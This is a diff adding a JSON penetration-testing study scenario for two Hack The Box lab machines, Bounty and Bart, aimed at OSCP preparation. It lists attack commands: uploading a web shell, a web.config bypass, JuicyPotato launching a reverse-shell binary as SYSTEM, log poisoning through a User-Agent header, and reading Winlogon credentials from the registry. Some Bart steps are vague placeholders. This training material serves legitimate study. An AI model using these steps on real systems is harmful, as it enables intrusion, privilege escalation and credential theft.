@@ -1,0 +1,172 @@
+{
+  "id": "iis-upload-bypass",
+  "title": "IIS Upload Bypass",
+  "category": "windows-standalone",
+  "source": ["HTB Bounty", "HTB Bart"],
+  "designed_by": "ai-composite",
+  "description": "Two Windows standalone machines: Bounty — IIS file upload → web.config ASP trick → JuicyPotato → SYSTEM. Bart — vhost discovery → internal chat → log poisoning → PSCredential → winlogon registry → Administrator.",
+
+  "introduction": "IIS upload bypasses and web.config tricks are common Windows paths—master these for OSCP time savings.",
+  "mental_model": "When upload blocks .aspx, use web.config to map .jpg to ASP handler. SeImpersonate → JuicyPotato.",
+  "key_principles": [
+    "web.config can map .jpg to ASP handler for bypass",
+    "JuicyPotato exploits SeImpersonate for SYSTEM",
+    "vhost fuzzing reveals hidden internal apps",
+    "Log poisoning injects code via User-Agent",
+    "PSCredential and winlogon may store admin creds"
+  ],
+
+  "indicators": {
+    "difficulty": 5,
+    "cognitive_load": 4,
+    "enumeration_depth": 5,
+    "rabbit_hole_risk": 5,
+    "time_pressure": 4
+  },
+
+  "mitre": {
+    "tactics": ["TA0001", "TA0003", "TA0004", "TA0006"],
+    "techniques": [
+      {"id": "T1190", "name": "Exploit Public-Facing Application"},
+      {"id": "T1134.001", "name": "Token Impersonation/Theft"},
+      {"id": "T1552.001", "name": "Credentials In Files"},
+      {"id": "T1068", "name": "Exploitation for Privilege Escalation"},
+      {"id": "T1087.002", "name": "Domain Account"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon", "T2-Web-Access", "T3-NonWeb-Access", "T4b-Win-PrivEsc", "T5-Credentials"],
+
+  "environment": {
+    "machine_count": 2,
+    "network_count": 1,
+    "os_distribution": {"windows": 2, "linux": 0},
+    "has_ad": false,
+    "has_pivoting": false,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "iis", "web.config", "asp", "juicypotato", "seimpersonate",
+    "vhost", "log-poisoning", "pscredential", "winlogon", "registry",
+    "feroxbuster", "gobuster", "burp"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": false,
+    "pen200_modules": [6, 8, 12, 16, 17, 22],
+    "pattern_frequency": "medium",
+    "recommended_order": 8
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "10.10.10.0/24", "label": "External"}
+  ],
+
+  "machines": [
+    {
+      "id": "bounty",
+      "label": "BOUNTY",
+      "ip": "10.10.10.93",
+      "os": "Windows",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {
+          "port": 80,
+          "name": "HTTP (IIS)",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "upload", "summary": "IIS file upload with extension bypass", "leads_to": "web-shell"}
+          ],
+          "commands": [
+            "nmap -sV 10.10.10.93",
+            "gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirb/common.txt",
+            "# Upload .aspx or .config: web.config with ASP handler for .jpg",
+            "curl -F 'file=@shell.aspx' http://10.10.10.93/upload/",
+            "# Or: upload web.config with <add verb=\"*\" path=\"*.jpg\" type=\"System.Web.UI.Page\" />"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "iis apppool\\defaultapppool",
+          "to": "SYSTEM",
+          "technique": "JuicyPotato (SeImpersonate)",
+          "commands": [
+            "whoami /priv",
+            {"cmd": "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c \"c:\\windows\\temp\\rev.exe\"", "rationale": "Why: SeImpersonate lets us steal SYSTEM via COM"},
+            "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\windows\\temp\\rev.exe\""
+          ]
+        }
+      ],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "bart",
+      "label": "BART",
+      "ip": "10.10.10.81",
+      "os": "Windows",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {
+          "port": 80,
+          "name": "HTTP (IIS)",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "vhost", "summary": "vhost discovery → internal chat application", "leads_to": "chat"},
+            {"type": "lfi", "summary": "Log poisoning via User-Agent or file path", "leads_to": "rce"}
+          ],
+          "commands": [
+            "nmap -sV 10.10.10.81",
+            "ffuf -u http://10.10.10.81 -H 'Host: FUZZ.bart.htb' -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt",
+            "# Access internal chat at internal.bart.htb or similar",
+            "# Log poisoning: User-Agent <%# ... %> or similar",
+            "curl -H 'User-Agent: <%# ... code %>' http://10.10.10.81/log"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "user",
+          "to": "Administrator",
+          "technique": "PSCredential from chat → winlogon registry",
+          "commands": [
+            "# Decode PSCredential from chat/log",
+            "python3 -c \"from base64 import b64decode; ...\"",
+            "reg query HKU\\<sid>\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+            "# Or: decrypt PSCredential from stored chat"
+          ]
+        }
+      ],
+      "credentials": [
+        {"user": "Administrator", "type": "pscredential", "source": "PSCredential from internal chat / log poisoning", "unlocks": ["bart-admin"]}
+      ],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [],
+
+  "attack_paths": [
+    {
+      "id": "path-bounty",
+      "name": "Bounty (IIS upload → web.config → JuicyPotato)",
+      "color": "#6bb8cc",
+      "steps": ["bounty"],
+      "description": "IIS file upload → web.config ASP trick → JuicyPotato → SYSTEM"
+    },
+    {
+      "id": "path-bart",
+      "name": "Bart (vhost → log poisoning → PSCredential)",
+      "color": "#e8a87c",
+      "steps": ["bart"],
+      "description": "vhost discovery → internal chat → log poisoning → PSCredential → winlogon registry → Administrator"
+    }
+  ]
+}
